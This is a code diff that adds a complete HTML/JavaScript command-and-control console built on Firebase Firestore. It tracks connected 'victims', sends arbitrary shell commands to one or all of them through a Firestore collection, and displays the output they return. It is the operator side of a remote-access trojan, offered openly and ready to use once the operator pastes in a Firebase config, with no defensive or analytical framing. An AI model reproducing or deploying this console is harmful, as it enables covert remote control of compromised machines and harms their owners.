@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Terminal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', Consolas, monospace;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+        }
+        #header {
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+        }
+        #terminal {
+            flex: 1;
+            overflow-y: auto;
+            border: 1px solid #0f0;
+            padding: 10px;
+            margin-bottom: 10px;
+            background: #0a0a0a;
+            font-size: 14px;
+        }
+        #inputContainer {
+            display: flex;
+            gap: 5px;
+        }
+        #victimSelect {
+            background: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 5px;
+            font-family: inherit;
+            flex: 0 0 150px;
+        }
+        #input {
+            flex: 1;
+            background: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 5px;
+            font-family: inherit;
+            font-size: 14px;
+        }
+        .line { margin: 2px 0; }
+        .command { color: #0f0; font-weight: bold; }
+        .output { color: #fff; white-space: pre-wrap; }
+        .error { color: #f00; }
+        .info { color: #888; }
+        .timestamp { color: #666; font-size: 11px; }
+    </style>
+</head>
+<body>
+    <div id="header">
+        <div class="command">═══ C2 COMMAND & CONTROL TERMINAL ═══</div>
+        <div class="info">Active Victims: <span id="victimCount">0</span></div>
+    </div>
+    <div id="terminal"></div>
+    <div id="inputContainer">
+        <select id="victimSelect">
+            <option value="ALL">ALL VICTIMS</option>
+        </select>
+        <input type="text" id="input" placeholder="Enter command..." autofocus>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+
+    <script>
+        // ========== PASTE YOUR FIREBASE CONFIG HERE ==========
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "your-project.firebaseapp.com",
+            projectId: "your-project-id",
+            storageBucket: "your-project.firebasestorage.app",
+            messagingSenderId: "123456789",
+            appId: "1:123456789:web:abcdef"
+        };
+        // =====================================================
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        const terminal = document.getElementById('terminal');
+        const input = document.getElementById('input');
+        const victimSelect = document.getElementById('victimSelect');
+        const victimCountEl = document.getElementById('victimCount');
+
+        const victims = new Set();
+
+        // Update victim list
+        function updateVictimList() {
+            victimCountEl.textContent = victims.size;
+            
+            const currentValue = victimSelect.value;
+            victimSelect.innerHTML = '<option value="ALL">ALL VICTIMS</option>';
+            
+            victims.forEach(v => {
+                const option = document.createElement('option');
+                option.value = v;
+                option.textContent = v;
+                victimSelect.appendChild(option);
+            });
+            
+            if (victims.has(currentValue)) {
+                victimSelect.value = currentValue;
+            }
+        }
+
+        // Send command
+        input.addEventListener('keypress', async (e) => {
+            if (e.key === 'Enter' && input.value.trim()) {
+                const cmd = input.value.trim();
+                const targetVictim = victimSelect.value;
+                
+                appendToTerminal(`> ${cmd}`, 'command');
+                
+                if (targetVictim === 'ALL') {
+                    // Send to all victims
+                    if (victims.size === 0) {
+                        appendToTerminal('No active victims!', 'error');
+                    } else {
+                        for (const victim of victims) {
+                            await sendCommand(victim, cmd);
+                        }
+                        appendToTerminal(`Sent to ${victims.size} victim(s)`, 'info');
+                    }
+                } else {
+                    await sendCommand(targetVictim, cmd);
+                    appendToTerminal(`Sent to ${targetVictim}`, 'info');
+                }
+                
+                input.value = '';
+            }
+        });
+
+        async function sendCommand(victimId, command) {
+            try {
+                await db.collection('commands').add({
+                    victim_id: victimId,
+                    command: command,
+                    output: '',
+                    executed: false,
+                    printed: false,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                });
+            } catch (error) {
+                appendToTerminal('Error: ' + error.message, 'error');
+            }
+        }
+
+        // Listen for outputs (real-time)
+        db.collection('commands')
+            .where('executed', '==', true)
+            .where('printed', '==', false)
+            .onSnapshot((snapshot) => {
+                snapshot.docChanges().forEach(async (change) => {
+                    if (change.type === 'added' || change.type === 'modified') {
+                        const cmd = change.doc.data();
+                        
+                        // Track victim
+                        victims.add(cmd.victim_id);
+                        updateVictimList();
+                        
+                        // Display output
+                        const time = cmd.timestamp?.toDate().toLocaleTimeString() || '';
+                        appendToTerminal(`\n[${time}] [${cmd.victim_id}]`, 'timestamp');
+                        appendToTerminal(`Command: ${cmd.command}`, 'info');
+                        appendToTerminal(cmd.output || '(empty)', 'output');
+                        
+                        // Mark as printed
+                        await change.doc.ref.update({ printed: true });
+                    }
+                });
+            });
+
+        // Track active victims (those who checked in recently)
+        db.collection('commands')
+            .where('timestamp', '>', new Date(Date.now() - 60000)) // Last 1 minute
+            .onSnapshot((snapshot) => {
+                snapshot.forEach(doc => {
+                    victims.add(doc.data().victim_id);
+                });
+                updateVictimList();
+            });
+
+        function appendToTerminal(text, className) {
+            const div = document.createElement('div');
+            div.className = `line ${className}`;
+            div.textContent = text;
+            terminal.appendChild(div);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        appendToTerminal('═══ Terminal Ready ═══', 'command');
+        appendToTerminal('Waiting for victims to connect...', 'info');
+    </script>
+</body>
+</html>
